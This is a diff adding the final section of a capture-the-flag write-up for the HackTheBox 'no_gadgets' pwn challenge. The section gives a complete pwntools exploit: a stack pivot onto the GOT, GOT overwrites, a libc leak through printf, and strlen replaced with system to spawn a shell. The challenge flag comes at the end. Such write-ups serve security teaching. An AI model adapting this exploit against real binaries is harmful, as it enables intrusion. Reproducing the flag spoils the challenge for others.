@@ -283,3 +283,98 @@ sh.interactive()
 
 38. Meaning now we can pass `/bin/sh\x00` strings and overwrite strlen with `system@got` to drop a shell!
 
+> FULL EXPLOIT SCRIPT
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+exe = './no_gadgets'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'INFO'
+
+library = './libc.so.6'
+libc = context.binary = ELF(library, checksec=False)
+context.log_level = 'INFO'
+
+sh = process(exe)
+# sh = remote('94.237.50.242',55086)
+
+fgets_gadget = 0x40121b
+log.success(f'FGETS GADGET -> {hex(fgets_gadget)}')
+rop = ROP(elf)
+
+# [+] BYPASS STRLEN AND SET RSP TO FAKE SAVED RBP
+
+p = flat([
+    b'\x00', # bypass strlen
+    b'\x90' * 127, # pad to RBP
+    elf.got['puts']+0x80, # fake saved RBP (RSP start di puts@got)
+    rop.find_gadget(['ret']).address, # stack alignment
+    fgets_gadget # return to fgets call
+])
+
+sh.sendlineafter(b':', p)
+
+# [+] CREATE FAKE RBP
+
+'''
+pwndbg> got
+Filtering out read-only entries (display them with -r or --show-readonly)
+
+GOT protection: Partial RELRO | Found 6 GOT entries passing the filter
+[0x404000] puts@GLIBC_2.2.5 -> 0x7ffff7c80ed0 (puts) ◂— endbr64 
+[0x404008] strlen@GLIBC_2.2.5 -> 0x401046 (strlen@plt+6) ◂— push 1
+[0x404010] printf@GLIBC_2.2.5 -> 0x7ffff7c60770 (printf) ◂— endbr64 
+[0x404018] fgets@GLIBC_2.2.5 -> 0x7ffff7c7f400 (fgets) ◂— endbr64 
+[0x404020] setvbuf@GLIBC_2.2.5 -> 0x7ffff7c81670 (setvbuf) ◂— endbr64 
+[0x404028] exit@GLIBC_2.2.5 -> 0x401086 (exit@plt+6) ◂— push 5
+pwndbg> 
+'''
+
+p = flat([
+    b'%p'*4,
+    0x0000000000401216, # replacing strlen@got with printf call
+    elf.plt['printf']+0x6, #printf@got
+    elf.plt['fgets']+0x6, #fgets@got
+    elf.plt['setvbuf']+0x6, #setvbuf@got
+    elf.plt['exit']+0x6  #exit@got
+])
+
+sh.sendline(p)
+
+# [+] PARSE LIBC LEAK AND RELOCATE FOR LIBC BASE
+
+sh.recvuntil(b'scratch!\n')
+get = sh.recvuntil(b'0xfb')
+libc_leak = eval(get[0:14])
+log.success(f'LIBC LEAK --> {hex(libc_leak)}')
+
+libc.address = libc_leak - 2202403
+log.success(f'LIBC BASE --> {hex(libc.address)}')
+
+# [+] DROP SHELL
+
+p = flat([
+    b'/bin/sh\x00',
+    libc.sym['system']
+])
+
+sh.sendline(p)
+
+sh.interactive()
+```
+
+> RESULT
+
+![image](https://github.com/user-attachments/assets/64eda753-fad1-4ddc-9971-118194aba5ec)
+
+39. Awesome! We've pwned it!
+
+## FLAG:
+
+```
+HTB{p0p_rD1_i5_0v3RaTed}
+```
